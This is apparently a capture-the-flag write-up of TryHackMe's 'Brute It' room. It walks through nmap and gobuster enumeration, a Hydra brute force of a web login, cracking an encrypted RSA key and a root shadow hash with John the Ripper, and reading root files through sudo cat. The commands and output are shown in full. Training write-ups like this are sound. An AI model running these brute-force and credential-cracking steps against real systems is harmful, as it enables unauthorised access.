# Brute It

URL: https://tryhackme.com/room/bruteit

Level: easy

Date: 1 July 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [SSH version](#ssh-version)
	- [Apache version](#apache-version)
	- [Dirbusting](#web-server-dirbusting)
- [Getting a shell](#getting-a-shell)
	- [Login form](#login-form)
	- [Hydra](#brute-force-login-form)
	- [RSA key](#rsa-key)
	- [User flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
	- [sudo](#sudo)
	- [root flag](#root-flag)
	- [root password](#root-password)



## Reconnaissance

### nmap

```bash
# Nmap 7.93 scan initiated Sun Jul  2 19:20:41 2023 as: nmap -T4 -p- -n -oA bruteit 10.10.186.184
Nmap scan report for 10.10.186.184
Host is up (0.076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Jul  2 19:27:33 2023 -- 1 IP address (1 host up) scanned in 412.42 seconds
```

### ssh version

```bash
joshua@kaligra:~/Documents/thm/bruteit$ nmap -p22 -sV 10.10.186.184
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 19:32 CEST
Nmap scan report for 10.10.186.184
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
```

### Apache version

```bash
joshua@kaligra:~/Documents/thm/bruteit$ nmap -p80 -sV 10.10.186.184
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 19:33 CEST
Nmap scan report for 10.10.186.184
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds
```

### web server dirbusting

```bash
joshua@kaligra:~/Documents/thm/bruteit$ gobuster dir -u http://10.10.186.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.186.184
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/07/02 19:34:40 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.186.184/admin/]
```

# Getting a shell

## login form

![](Pasted%20image%2020230702193730.png)


Take a look on HTML source:

```html
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
```

So far we know the username is `admin`

We intercept a login attempt with Burpsuite and we get this:


```bash
POST /admin/ HTTP/1.1
Host: 10.10.186.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://10.10.186.184
Connection: close
Referer: http://10.10.186.184/admin/
Cookie: PHPSESSID=osvjgovbut8nks1hfl4jdkgsn0
Upgrade-Insecure-Requests: 1

user=admin&pass=admin
```

A failed login shows:

```
Username or password invalid
```

## brute force login form

```bash
joshua@kaligra:~/Documents/thm/bruteit$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.186.184 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-02 19:50:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.186.184:80/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: 10.10.186.184   login: admin   password: xxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-02 19:51:03
```

## rsa key

We get a simple web page with a "web flag" and an RSA private key that we need to crack:

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----
```

Let's convert in John The Ripper format:

```bash
joshua@kaligra:~/Documents/thm/bruteit$ ssh2john id_rsa
id_rsa:$sshng$1$16$E32C44CDC29375458A02E94F94B280EA$1200$2423ec7a7b726dd092c7c40c39c58a9c802c9c84444e3663cfa00b2645f79ca488e2de34cbc59f59f901883aafc4b22652b16edfefd40a65f071e5bab89ed9e42a6a305a5440df28194c5c98e74f03cf1ba44066507fef0f62bf67e2a0d2f63406f6d3cf75447295c9ca0b68f56460dccf57495b26b31a5a0049785c137c12694a02447e14b8f6d6a6f33f337c63b6ca1d84342f8de322e94d28e12af636c8f0ed5ce58530a30b5594f04d4a5cd132e12171e2756d80d6c94424df3a552da5f..
..
..
```


Crack it:

```bash
joshua@kaligra:~/Documents/thm/bruteit$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_to_crack
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
1g 0:00:00:00 DONE (2023-07-02 21:13) 14.28g/s 1037Kp/s 1037Kc/s 1037KC/s rubicon..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


Let's login as `john` user with `id_rsa` key:

```bash
joshua@kaligra:~/Documents/thm/bruteit$ chmod 600 id_rsa
joshua@kaligra:~/Documents/thm/bruteit$ ssh -i id_rsa john@10.10.166.210
The authenticity of host '10.10.166.210 (10.10.166.210)' can't be established.
ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.166.210' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Kubernetes 1.19 is out! Get it in one command with:

     sudo snap install microk8s --channel=1.19 --classic

   https://microk8s.io/ has docs and details.

63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106


john@bruteit:~$
```

## user flag

```bash
john@bruteit:~$ cat user.txt
THM{a_passwordXXXXXXXXXXX}
```

# Privilege Escalation

## sudo

```bash
john@bruteit:~$ crontab -l
no crontab for john
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

## root flag

```bash
john@bruteit:~$ sudo cat /root/root.txt
THM{XXXXXXXXXXXXX}
```

## root password

```bash
john@bruteit:~$ sudo cat /etc/shadow | grep root
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

```bash
joshua@kaligra:~/Documents/thm/bruteit$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxx         (root)
1g 0:00:00:00 DONE (2023-07-02 22:01) 10.00g/s 2560p/s 2560c/s 2560C/s 123456..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

